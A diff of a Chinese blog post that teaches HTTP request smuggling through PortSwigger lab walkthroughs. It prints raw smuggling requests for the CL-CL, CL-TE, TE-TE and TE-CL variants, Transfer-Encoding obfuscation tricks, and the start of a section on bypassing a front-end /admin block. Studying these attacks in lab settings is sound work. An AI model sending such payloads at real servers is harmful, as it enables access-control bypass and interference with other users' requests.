@@ -1,247 +1,72 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/atkx_16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/atkx-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="摘要：HTTP请求走私漏洞学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP请求走私漏洞">
+<meta property="og:url" content="https://swhat.github.io/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="At的小站">
+<meta property="og:description" content="摘要：HTTP请求走私漏洞学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185910-522340.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185934-758668.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190020-357686.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190033-562357.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185807-72744.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190116-607083.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190225-786616.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190234-493978.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190250-681892.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190306-543465.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190317-764210.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190337-171562.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190419-108405.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190431-281494.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190443-9518.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190458-985555.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190522-947042.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190536-739950.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190544-763227.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190552-248001.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190623-841809.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210206224207823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210206224349121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202105/02/225619-18140.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190649-214946.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191236-584099.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191456-261196.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191607-151742.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191701-2570.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191814-959740.png">
+<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/192008-795497.png">
+<meta property="article:published_time" content="2021-04-11T13:52:10.000Z">
+<meta property="article:modified_time" content="2021-08-15T03:59:06.553Z">
+<meta property="article:author" content="Atkx">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185910-522340.png"><title>HTTP请求走私漏洞 | At的小站</title><link ref="canonical" href="https://swhat.github.io/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
 
-
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
-
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/atkx_16x16.png">
-  <link rel="icon" href="/img/atkx_16x16.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="摘要：HTTP请求走私漏洞学习">
-  <meta name="author" content="Atkx">
-  <meta name="keywords" content="">
-  
-  <title>HTTP请求走私漏洞 - At的小站</title>
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
-  
-    
-    
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
-    
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
-  
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"swhat.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="At的小站" type="application/atom+xml">
-</head>
-
-
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Atkx</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="banner" id="banner" parallax=true
-         style="background: url('/img/bg_image2.jpg') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="HTTP请求走私漏洞">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-04-11 21:52" pubdate>
-        2021年4月11日 晚上
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      4k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      50
-       分钟
-    </span>
-  
-
-  
-  
-</div>
-
-            
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">HTTP请求走私漏洞</h1>
-            
-            <div class="markdown-body">
-              <p>摘要：HTTP请求走私漏洞学习</p>
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="At的小站" type="application/atom+xml">
+</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fas-folder-open"></i></span><span class="header-nav-menu-item__text">menu.links</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">At的小站</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">HTTP请求走私漏洞</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-04-11</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">4k</span></span></div></header><div class="post-body"><p>摘要：HTTP请求走私漏洞学习</p>
  <a id="more"></a>
 
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做一道题的时候，在大师傅的wp中发现可以利用HTTP请求走私漏洞绕过WAF,联想到hgame2021也有类似的题，当时连wp都看不懂，直接使用官方wp的Payload，也不能得到结果，现在来总结一下。</p>
@@ -278,7 +103,7 @@
 <h3 id="CL-CL漏洞"><a href="#CL-CL漏洞" class="headerlink" title="CL-CL漏洞"></a>CL-CL漏洞</h3><p><strong>RFC7230规范</strong>：在RFC7230的<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7230#section-3.3.3">第3.3.3节</a>中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p>
 <p>构造请求：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 5\r\n<br>Content-Length: 6\r\n<br>\r\n<br>12345\r\n<br>a<br></code></pre></td></tr></table></figure>
-<p>得到响应，返回400 Bad Request<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185910-522340.png" srcset="/img/loading.gif" lazyload alt="2"><br><strong>触发过程</strong></p>
+<p>得到响应，返回400 Bad Request<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185910-522340.png" alt="2"><br><strong>触发过程</strong></p>
 <p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p>
 <h3 id="CL-TE漏洞"><a href="#CL-TE漏洞" class="headerlink" title="CL-TE漏洞"></a>CL-TE漏洞</h3><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。</p>
 <p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p>
@@ -286,9 +111,9 @@
 <p>实验描述：<br>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码（Transfer-Encoding解析），前端服务器拒绝未使用GET或POST方法之外的请求。</p>
 <p>实验要求：<br>将请求走私到后端服务器，以便后端服务器处理的下一个请求像是使用了GPOST方法。</p>
 </blockquote>
-<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185934-758668.png" srcset="/img/loading.gif" lazyload alt="labs1"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190020-357686.png" srcset="/img/loading.gif" lazyload alt="1"><br>将请求行中请求方式修改为POST,在请求行添加Transfer-<code>Encoding: chunked</code>，然后在实体中添加</p>
+<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185934-758668.png" alt="labs1"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190020-357686.png" alt="1"><br>将请求行中请求方式修改为POST,在请求行添加Transfer-<code>Encoding: chunked</code>，然后在实体中添加</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G\r\n<br></code></pre></td></tr></table></figure>
-<p>连续发送两次请求就可以获得响应。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190033-562357.png" srcset="/img/loading.gif" lazyload alt="2"><br>分析：连续请求，G会被带入下一个请求，变为 <code>GPOST / HTTP/1.1\r\n</code></p>
+<p>连续发送两次请求就可以获得响应。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190033-562357.png" alt="2"><br>分析：连续请求，G会被带入下一个请求，变为 <code>GPOST / HTTP/1.1\r\n</code></p>
 <p><strong>触发过程</strong></p>
 <p>前端服务器处理Content-Length头并确定请求主体长度为6个字节</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G<br></code></pre></td></tr></table></figure>
@@ -301,19 +126,19 @@
 <p>这里列出七种混淆方式</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Transfer-Encoding: xchunked<br><br>Transfer-Encoding : chunked<br><br>Transfer-Encoding: x<br><br>Transfer-Encoding:[tab]chunked<br><br>[space]Transfer-Encoding: chunked<br><br>X: X[\n]Transfer-Encoding: chunked<br><br>Transfer-Encoding<br>: chunked<br></code></pre></td></tr></table></figure>
 <p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。而我们所要做的就是找到其中存在问题的服务器，然后使用类似前两个情形的攻击报文走私数据。</p>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.TE验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185807-72744.png" srcset="/img/loading.gif" lazyload alt="QQ截图20210406190848"><br>构造请求，注意同样需要去掉勾选Update Content-Length</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.TE验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185807-72744.png" alt="QQ截图20210406190848"><br>构造请求，注意同样需要去掉勾选Update Content-Length</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>Transfer-encoding: cow\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure>
-<p>连续发送两次请求<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190116-607083.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p>连续发送两次请求<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190116-607083.png" alt="2"></p>
 <p>分析：前端将body的内容视为正常请求，到了后端，因为<code>Transfer-encoding: cow</code>无法识别，将会转而使用<code>Content-length: 4</code>，从而产生报错</p>
 <h3 id="TE-CL漏洞"><a href="#TE-CL漏洞" class="headerlink" title="TE-CL漏洞"></a>TE-CL漏洞</h3><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190225-786616.png" srcset="/img/loading.gif" lazyload alt="timu"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190234-493978.png" srcset="/img/loading.gif" lazyload alt="1"><br>进入实验，首先需要去掉勾选Update Content-Length防止Buprsuite自动更新Content-Length字段<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190250-681892.png" srcset="/img/loading.gif" lazyload alt="0"><br>构造请求</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190225-786616.png" alt="timu"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190234-493978.png" alt="1"><br>进入实验，首先需要去掉勾选Update Content-Length防止Buprsuite自动更新Content-Length字段<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190250-681892.png" alt="0"><br>构造请求</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>......<br>Transfer-Encoding: chunked\r\n<br>Content-Length: 3\r\n<br>\r\n<br>1\r\n<br>G\r\n<br>0\r\n<br>\r\n<br>\r\n<br></code></pre></td></tr></table></figure>
-<p>连续发送两次请求得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190306-543465.png" srcset="/img/loading.gif" lazyload alt="2"><br>G和0被走私了，带入了带入下一个请求，响应报文请求方法是G0POST，我们需要完整构造GPOST报文请求</p>
+<p>连续发送两次请求得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190306-543465.png" alt="2"><br>G和0被走私了，带入了带入下一个请求，响应报文请求方法是G0POST，我们需要完整构造GPOST报文请求</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>12\r\n<br>GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure>
-<p>连续请求两次<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190317-764210.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p>连续请求两次<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190317-764210.png" alt="3"></p>
 <p>官方提供的方法</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: your-lab-id.web-security-academy.net\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded\r\n<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure>
-<p>得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190337-171562.png" srcset="/img/loading.gif" lazyload alt="4"><br><strong>触发过程</strong><br>由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
+<p>得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190337-171562.png" alt="4"><br><strong>触发过程</strong><br>由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure>
 <p>成功报错。</p>
 <p>前端服务器处理Transfer-Encoding标头，因此将消息正文视为使用分块编码。它处理第一个块，声明为12个字节长，直到下一行的开始<code>GPOST / HTTP/1.1</code>。它处理第二个数据块，该数据块的长度为零，因此被视为终止请求。该请求被转发到后端服务器。</p>
@@ -324,7 +149,7 @@
 <p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p>
 </blockquote>
 <h3 id="利用CL-TE漏洞绕过"><a href="#利用CL-TE漏洞绕过" class="headerlink" title="利用CL-TE漏洞绕过"></a>利用CL-TE漏洞绕过</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a></p>
-<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190419-108405.png" srcset="/img/loading.gif" lazyload alt="timu"></p>
+<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190419-108405.png" alt="timu"></p>
 <blockquote>
 <p>实验描述：</p>
 <p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p>
@@ -333,35 +158,35 @@
 <p>按照要求访问管理面板/admin，会提示Path /admin is blocked</p>
 <p>利用CL-TE漏洞，构造数据包</p>
